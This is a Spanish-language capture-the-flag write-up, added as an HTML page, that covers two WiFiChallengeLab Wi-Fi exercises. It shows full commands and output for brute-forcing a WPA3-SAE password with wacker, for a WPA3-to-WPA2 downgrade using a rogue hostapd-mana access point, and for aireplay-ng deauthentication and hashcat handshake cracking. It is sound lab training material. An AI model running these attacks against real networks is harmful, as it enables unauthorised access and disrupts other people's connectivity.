@@ -1,0 +1,264 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>WifiChallengeLab - Wi-Fi - SAE (Simultaneous Authentication of Equals) · MiguelRega7</title>
+<meta name="description" content="SAE (Simultaneous Authentication of Equals) es un método de autenticación robusto para redes WPA3, es un protocolo de autenticación y de intercambio de claves basado en contraseñas"><meta name="theme-color" content="#070a0f">
+<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<header class="header"><div class="nav wrap">
+<a class="brand" href="/" aria-label="MiguelRega7">MR<em>7</em></a>
+<nav class="links"><a class="nav-link" data-nav="home" href="/">INICIO</a><a class="nav-link" data-nav="writeups" href="/#writeups">WRITEUPS</a><a class="nav-link" data-nav="about" href="/about/">ABOUT</a></nav>
+<div class="socials">
+<a href="https://github.com/MikeRega7" target="_blank" rel="noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .7a11.5 11.5 0 0 0-3.64 22.4c.58.1.79-.25.79-.56v-2.04c-3.2.7-3.87-1.35-3.87-1.35-.52-1.32-1.27-1.67-1.27-1.67-1.04-.71.08-.7.08-.7 1.15.08 1.75 1.18 1.75 1.18 1.02 1.74 2.67 1.24 3.32.95.1-.74.4-1.24.72-1.53-2.55-.29-5.24-1.28-5.24-5.7 0-1.26.45-2.29 1.18-3.1-.12-.3-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.73 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.75.11 3.05.74.81 1.18 1.84 1.18 3.1 0 4.43-2.7 5.4-5.26 5.69.41.35.77 1.04.77 2.1v3.07c0 .31.21.67.8.55A11.5 11.5 0 0 0 12 .7Z"/></svg></a>
+<a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" rel="noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M5.2 3.2A2.2 2.2 0 1 1 5.2 7.6a2.2 2.2 0 0 1 0-4.4ZM3.4 8.9h3.6V20H3.4V8.9Zm5.8 0h3.4v1.52h.05c.47-.9 1.62-1.84 3.34-1.84 3.57 0 4.23 2.35 4.23 5.4V20h-3.55v-5.34c0-1.27-.02-2.91-1.77-2.91-1.78 0-2.05 1.39-2.05 2.82V20H9.2V8.9Z"/></svg></a>
+<a href="https://www.instagram.com/_miguelitornuno7" target="_blank" rel="noreferrer" aria-label="Instagram"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="1.8" d="M7 2.9h10A4.1 4.1 0 0 1 21.1 7v10a4.1 4.1 0 0 1-4.1 4.1H7A4.1 4.1 0 0 1 2.9 17V7A4.1 4.1 0 0 1 7 2.9Z"/><circle cx="12" cy="12" r="3.3" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="17.5" cy="6.7" r=".9" fill="currentColor"/></svg></a>
+
+</div><button class="menu" type="button" aria-label="Abrir menú" aria-expanded="false">☰</button>
+</div></header>
+<main class="wrap"><header class="article-head"><a class="back" href="/#writeups">← VOLVER A WRITEUPS</a><div class="article-head-row"><div><span class="article-tag">Wi-Fi</span><h1>WifiChallengeLab - Wi-Fi - SAE (Simultaneous Authentication of Equals)</h1><div class="meta"><span>◷</span><time>2025-08-03</time><span>·</span><span>WRITEUP</span><span>·</span><span>MR7 LAB</span></div></div><div class="share"><span>Compartir</span><button type="button" class="share-btn" data-copy-url="true">↗</button></div></div><p class="article-excerpt">SAE (Simultaneous Authentication of Equals) es un método de autenticación robusto para redes WPA3, es un protocolo de autenticación y de intercambio de claves basado en contraseñas.</p></header><div class="article-layout"><aside class="aside"><div class="aside-title">CONTENIDO</div><a href="#wifichallenge-lab-challenge-13-cu-l-es-la-flag-en-la-red-wifi-management">WiFiChallenge Lab - Challenge 13. ¿Cuál es la flag en la red wifi-management?</a><a href="#challenge-14-cu-l-es-la-flag-en-la-web-del-ap-wifi-it">Challenge 14. ¿Cuál es la flag en la web del AP wifi-IT?</a></aside><article class="article-content" id="top"><blockquote>
+<p>SAE (Simultaneous Authentication of Equals) es un método de autenticación robusto para redes WPA3, es un protocolo de autenticación y de intercambio de claves basado en contraseñas, utilizado en WPA3 (Wi-Fi Protected Access 3). Mejora la seguridad respecto a los protocolos anteriores al proporcionar resistencia a los ataques de fuerza bruta offline.</p>
+</blockquote>
+<h2 id="wifichallenge-lab-challenge-13-cu-l-es-la-flag-en-la-red-wifi-management">WiFiChallenge Lab - Challenge 13. ¿Cuál es la flag en la red wifi-management?</h2>
+<ul>
+<li>Primero vamos a comenzar escaneando para ver información de esta red wifi-management:</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:/home/user# airmon-ng start wlan0
+root@WiFiChallengeLab:/home/user# airmon-ng check kill
+</code></pre></div></div>
+<ul>
+<li>Vemos la red.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:/home/user# airodump-ng wlan0mon --band bg --wps -c11
+</code></pre></div></div>
+<p align="center">
+<img src="https://i.imgur.com/cHHCIWp.png">
+</p>
+
+<ul>
+<li>Lo que nos piden es saber la contraseña podemos hacer un ataque de fuerza bruta <a href="https://github.com/blunderbuss-wctf/wacker">https://github.com/blunderbuss-wctf/wacker</a> gracias a la utilización de Dragonfly handshake.</li>
+</ul>
+<blockquote>
+<p>Dragonblood es un conjunto de vulnerabilidades descubiertas en el protocolo WPA3, específicamente en el SAE. Tiene este nombre debido a que el Handshake de WPA3 se llama DragonFly. Estas vulnerabilidades afectan tanto la fase de autenticación como el proceso de intercambio de claves, permitiendo a los atacantes ejecutar diversos tipos de ataques, tales como la recuperación de contraseñas y la ejecución de ataques de denegación de servicio.</p>
+</blockquote>
+<ul>
+<li>Para atacar este protocolo primero necesitamos saber la frecuencia de la red wifi indicando el canal donde opera el AP:</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:/home/user# sudo iwlist wlan0mon frequency | grep 'Channel 11 :'
+          Channel 11 : 2.462 GHz
+</code></pre></div></div>
+<ul>
+<li>Ahora usamos la herramienta pasándole los parámetros que nos piden:</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:~/tools/wacker# ./wacker.py --wordlist ~/rockyou-top100000.txt --ssid wifi-management --bssid F0:9F:C2:11:0A:24 --interface wlan2 --freq 2462
+</code></pre></div></div>
+<ul>
+<li>Ahora tenemos la contraseña:</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/3dtenRm.png">
+</p>
+
+<ul>
+<li>Ahora que tenemos la contraseña podemos conectarnos a la red:</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:~# cat sae.conf 
+network={
+    ssid=&quot;wifi-management&quot;
+    psk=&quot;aqui va la contraseña&quot;
+    key_mgmt=SAE
+    scan_ssid=1
+    ieee80211w=2
+}
+</code></pre></div></div>
+<ul>
+<li>Ahora nos conectamos a la red:</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:~# wpa_supplicant -i wlan3 -c sae.conf
+Successfully initialized wpa_supplicant
+nl80211: send_and_recv-&gt;nl_recvmsgs failed: -33
+wlan3: SME: Trying to authenticate with f0:9f:c2:11:0a:24 (SSID='wifi-management' freq=2462 MHz)
+wlan3: SME: Trying to authenticate with f0:9f:c2:11:0a:24 (SSID='wifi-management' freq=2462 MHz)
+wlan3: PMKSA-CACHE-ADDED f0:9f:c2:11:0a:24 0
+wlan3: Trying to associate with f0:9f:c2:11:0a:24 (SSID='wifi-management' freq=2462 MHz)
+wlan3: Associated with f0:9f:c2:11:0a:24
+wlan3: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
+wlan3: WPA: Key negotiation completed with f0:9f:c2:11:0a:24 [PTK=CCMP GTK=CCMP]
+wlan3: CTRL-EVENT-CONNECTED - Connection to f0:9f:c2:11:0a:24 completed [id=0 id_str=]
+</code></pre></div></div>
+<ul>
+<li>Ahora para poder navegar nos asignamos IP:</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:/home/user# dhclient -v wlan3
+Internet Systems Consortium DHCP Client 4.4.1
+Copyright 2004-2018 Internet Systems Consortium.
+All rights reserved.
+For info, please visit https://www.isc.org/software/dhcp/
+
+Listening on LPF/wlan3/02:00:00:00:03:00
+Sending on   LPF/wlan3/02:00:00:00:03:00
+Sending on   Socket/fallback
+DHCPDISCOVER on wlan3 to 255.255.255.255 port 67 interval 3 (xid=0x5cdf3d77)
+DHCPDISCOVER on wlan3 to 255.255.255.255 port 67 interval 5 (xid=0x5cdf3d77)
+DHCPOFFER of 192.168.14.46 from 192.168.14.1
+DHCPREQUEST for 192.168.14.46 on wlan3 to 255.255.255.255 port 67 (xid=0x773ddf5c)
+DHCPACK of 192.168.14.46 from 192.168.14.1 (xid=0x5cdf3d77)
+bound to 192.168.14.46 -- renewal in 43145 seconds.
+</code></pre></div></div>
+<ul>
+<li>Ahora vamos a la web para ver la flag:</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/8MElZal.png">
+</p>
+
+<h2 id="challenge-14-cu-l-es-la-flag-en-la-web-del-ap-wifi-it">Challenge 14. ¿Cuál es la flag en la web del AP wifi-IT?</h2>
+<ul>
+<li>Para este nivel nos dan 2 pistas y nos dicen que tenemos que hacer el ataque downgrade y que el 802.11w esta deshabilitado.</li>
+</ul>
+<blockquote>
+<p>Este tipo de ataque consiste en engañar al dispositivo para que se conecte utilizando el protocolo WPA2 en lugar de WPA3, siendo vulnerable a ataques de WPA2.</p>
+</blockquote>
+<blockquote>
+<p>802.11w está deshabilitado&quot; significa que tu dispositivo o red Wi-Fi no está utilizando una característica de seguridad específica del estándar Wi-Fi llamada &quot;Protected Management Frames&quot; (PMF), Con 802.11w habilitado, esos mensajes están cifrados y autenticados, lo que evita que un atacante pueda expulsarte fácilmente de la red Wi-Fi.</p>
+</blockquote>
+<ul>
+<li>Para comprobar si esta habilitado o no podemos usar Wireshark examinando un .cap que exportemos al capturar paquetes de la red:</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:~# airodump-ng wlan0mon --band bg -c11 -w captura
+</code></pre></div></div>
+<ul>
+<li>Vemos al cliente conectado:</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/OHLhVHJ.png">
+</p>
+
+<ul>
+<li>Ahora vemos con wireshark que esta en false:</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/XB3Tcih.png">
+</p>
+
+<ul>
+<li>Para hacer este ataque vamos a comenzar escribiendo el archivo de configuración para el fakeAP.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:~# cat saw.conf 
+interface=wlan1
+driver=nl80211
+hw_mode=g
+channel=11
+ssid=wifi-IT
+mana_wpaout=hostapd-IT.hccapx
+wpa=2
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP CCMP
+wpa_passphrase=12345678
+</code></pre></div></div>
+<ul>
+<li>Ahora levantamos el fakeAP:</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:~# iwconfig wlan0mon channel 11
+root@WiFiChallengeLab:~# hostapd-mana saw.conf 
+Configuration file: saw.conf
+MANA: Captured WPA/2 handshakes will be written to file 'hostapd-IT.hccapx'.
+Using interface wlan1 with hwaddr 02:00:00:00:01:00 and ssid &quot;wifi-IT&quot;
+wlan1: interface state UNINITIALIZED-&gt;ENABLED
+wlan1: AP-ENABLED 
+</code></pre></div></div>
+<ul>
+<li>Ahora vamos a expulsar al cliente para obtener el handshake.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:/home/user# aireplay-ng wlan0mon -0 0 -a F0:9F:C2:1A:CA:25 -c 10:F9:6F:AC:53:52
+20:43:15  Waiting for beacon frame (BSSID: F0:9F:C2:1A:CA:25) on channel 11
+20:43:15  Sending 64 directed DeAuth (code 7). STMAC: [10:F9:6F:AC:53:52] [ 0| 0 ACKs]
+20:43:16  Sending 64 directed DeAuth (code 7). STMAC: [10:F9:6F:AC:53:52] [ 0| 0 ACKs]
+20:43:17  Sending 64 directed DeAuth (code 7). STMAC: [10:F9:6F:AC:53:52] [ 0| 0 ACKs]
+20:43:17  Sending 64 directed DeAuth (code 7). STMAC: [10:F9:6F:AC:53:52] [ 0| 0 ACKs]
+20:43:18  Sending 64 directed DeAuth (code 7). STMAC: [10:F9:6F:AC:53:52] [ 0| 0 ACKs]
+20:43:19  Sending 64 directed DeAuth (code 7). STMAC: [10:F9:6F:AC:53:52] [ 0| 0 ACKs]
+20:43:19  Sending 64 directed DeAuth (code 7). STMAC: [10:F9:6F:AC:53:52] [ 0| 0 ACKs]
+^C
+</code></pre></div></div>
+<ul>
+<li>Obtenemos el handshake:</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/QmMRRTX.png">
+</p>
+
+<ul>
+<li>Vamos hacer el formato correcto para guardar el handshake.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:~# cat hostapd-IT.hccapx | head -n 1 | awk '{print $3}' &gt;&gt; hostapd-itnow.22000
+</code></pre></div></div>
+<ul>
+<li>Ahora crackeamos el hash con hashcat.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">C:\Users\jmrn7\Tools\hashcat-6.2.6&gt;.\hashcat.exe -a 0 -m 22000 hostapd-itnow.22000 rockyou-top100000.txt --force     
+</code></pre></div></div>
+<ul>
+<li>Tenemos la contraseña:</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/Vt9sevk.png">
+</p>
+
+<ul>
+<li>Ahora nos podemos conectar.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:~# cat sae2.conf 
+network={
+   ssid=&quot;wifi-IT&quot;
+   psk=&quot;Aquí va la contraseña&quot;
+   key_mgmt=SAE
+   scan_ssid=1
+   ieee80211w=1
+ }
+</code></pre></div></div>
+<ul>
+<li>Ahora nos conectamos</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:~# wpa_supplicant -i wlan3 -c sae2.conf 
+Successfully initialized wpa_supplicant
+wlan3: SME: Trying to authenticate with f0:9f:c2:1a:ca:25 (SSID='wifi-IT' freq=2462 MHz)
+wlan3: SME: Trying to authenticate with f0:9f:c2:1a:ca:25 (SSID='wifi-IT' freq=2462 MHz)
+wlan3: PMKSA-CACHE-ADDED f0:9f:c2:1a:ca:25 0
+wlan3: Trying to associate with f0:9f:c2:1a:ca:25 (SSID='wifi-IT' freq=2462 MHz)
+wlan3: Associated with f0:9f:c2:1a:ca:25
+wlan3: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
+wlan3: WPA: Key negotiation completed with f0:9f:c2:1a:ca:25 [PTK=CCMP GTK=CCMP]
+wlan3: CTRL-EVENT-CONNECTED - Connection to f0:9f:c2:1a:ca:25 completed [id=0 id_str=]
+</code></pre></div></div>
+<ul>
+<li>Ahora nos asignamos IP.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:/home/user# dhclient wlan3 -v
+Internet Systems Consortium DHCP Client 4.4.1
+Copyright 2004-2018 Internet Systems Consortium.
+All rights reserved.
+For info, please visit https://www.isc.org/software/dhcp/
+
+Listening on LPF/wlan3/02:00:00:00:03:00
+Sending on   LPF/wlan3/02:00:00:00:03:00
+Sending on   Socket/fallback
+DHCPDISCOVER on wlan3 to 255.255.255.255 port 67 interval 3 (xid=0xf2ae2571)
+DHCPOFFER of 192.168.15.46 from 192.168.15.1
+DHCPREQUEST for 192.168.15.46 on wlan3 to 255.255.255.255 port 67 (xid=0x7125aef2)
+DHCPACK of 192.168.15.46 from 192.168.15.1 (xid=0xf2ae2571)
+bound to 192.168.15.46 -- renewal in 33409 seconds.
+</code></pre></div></div>
+<ul>
+<li>Vemos la flag final.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@WiFiChallengeLab:/home/user# curl -s http://192.168.15.1/login.php | grep flag
+    function copyFlagToClipboard(flag) {
+        navigator.clipboard.writeText(flag).then(() =&gt; {
+        alert(flag);
+    Flag: &lt;button onclick=&quot;copyFlagToClipboard('flag{xxxxxx-xxxxxxxxxxxxxxx-xxxxxxxxxxxxxx}')&quot;&gt;flag{xxxxxx-xxxxxxxxxxxxxxx-xxxxxxxxxxxxxx}&lt;/button&gt;
+</code></pre></div></div>
+</article></div></main>
+<footer class="footer wrap"><div><b>MR<em>7</em></b><div>Cybersecurity notes &amp; writeups.</div></div><div class="footer-links"><a href="https://github.com/MikeRega7">GitHub</a><a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278">LinkedIn</a><a href="https://www.instagram.com/_miguelitornuno7">Instagram</a></div></footer>
+<script src="/app.js?v=10"></script></body></html>
